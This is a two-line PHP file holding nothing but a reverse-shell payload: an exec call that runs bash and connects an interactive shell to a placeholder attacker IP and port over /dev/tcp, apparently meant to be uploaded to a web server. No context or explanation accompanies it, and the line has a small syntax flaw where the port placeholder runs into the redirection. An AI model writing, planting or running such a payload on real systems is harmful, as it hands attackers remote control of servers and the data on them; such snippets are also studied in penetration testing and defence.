<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker ip>/<attacker port>0>&1'");